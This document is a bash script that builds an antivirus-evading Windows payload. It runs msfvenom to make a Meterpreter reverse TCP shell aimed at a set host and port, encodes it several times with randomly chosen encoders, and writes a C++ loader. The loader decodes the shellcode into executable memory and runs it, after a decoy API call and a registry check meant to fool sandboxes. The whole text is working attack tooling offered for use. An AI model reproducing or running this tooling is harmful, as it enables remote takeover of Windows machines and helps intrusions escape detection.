#automatic
encoders=(
"x86/jmp_call_additive"
"x86/shikata_ga_nai"
"x86/bloxor"
"x86/call4_dword_xor"
)
list1Size=4

#choose 3 random encoders
i="2"
payload="windows/meterpreter/reverse_tcp"
LHOST=192.168.1.1
LPORT=4444

#Generate your payload add more params if needed
msfvenom -p $payload LHOST=$LHOST LPORT=$LPORT -b '\x00\x90' -a x86 --platform windows -e ${encoders[$RANDOM % list1Size]} -i  $i -f raw |  \

#Iterations for obfuscation
msfvenom -b '\x00\x90' -e ${encoders[$RANDOM % list1Size]} -i 3 -a x86 --platform windows -f raw | \
msfvenom -b '\x00\x90' -e ${encoders[$RANDOM % list1Size]} -i $i -a x86 --platform windows -f c | sed 's/[\\x]//g' > shellcode.txt


cat > ./compileme.cpp <<EOF 
#include <stdio.h>
#include <windows.h>
#include <strings.h>
typedef int(__cdecl *MYPROC)(LPWSTR);

void ExecuteCode(char *code,int codeSize){
    char *MyMem ;
    HINSTANCE K32 = LoadLibrary(TEXT("notexisted.dll"));

    MYPROC Allocate = (MYPROC) GetProcAddress(K32,"nofunc");
    
    MyMem = (char *) VirtualAlloc(NULL,codeSize, MEM_COMMIT,PAGE_EXECUTE_READWRITE);
    memcpy(MyMem,code,codeSize);
    
    ((void(*)())MyMem)();
}


char *Decrypt(char *code , int codeSize){
    codeSize *= 2;
    char *ret;
    char *ptr;
    ret = (char *) malloc(sizeof(*ret) * codeSize );
    char str[3];
    str[2] = '\0';
    
    for (int i=0;i < codeSize;i += 2){
        str[0] = code[i];
        str[1] = code[i+1];
        ret[i / 2] =  strtol(str,&ptr,16) ;
    }
    return ret;

}

void CheckAReg(char *code,int sz){
    DWORD disposition;
    HKEY result;
    long key =RegCreateKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\\Microsoft\\\Feeds",0,REG_NONE,REG_OPTION_NON_VOLATILE,KEY_READ,NULL,&result,&disposition);

    if (disposition == REG_OPENED_EXISTING_KEY){
        ExecuteCode(code,sz);
    }else{
            printf("");
    }
}

int main()
{

    char *alloc;
EOF
echo -e "\nGive me size of shellcode: ";
read size;

echo  "    int sz = $size;" >> compileme.cpp;
echo  "    char buf1[] = " >> compileme.cpp;
i=0;
for line in $(tail -n +2 shellcode.txt);
do 
    if (( $(($((size)) / 30)) > $((i)) ));
    then    
        echo $line >> compileme.cpp;
        let i+=1;
        if (( $(($((size)) / 30)) < $((i + 1)) ));
        then
            echo -e ";\n" >> compileme.cpp ;
            echo "    char buf2[]=" >> compileme.cpp;
        fi;
        continue;
    fi;

    echo $line >> compileme.cpp;
done

cat >> ./compileme.cpp <<EOF
    char final[sz];
    strcpy(final,buf1);
    strcat(final,buf2);               
    

    CheckAReg(final,sz);
    return 0;
}
EOF

echo "[+] Completed"; 
rm shellcode.txt
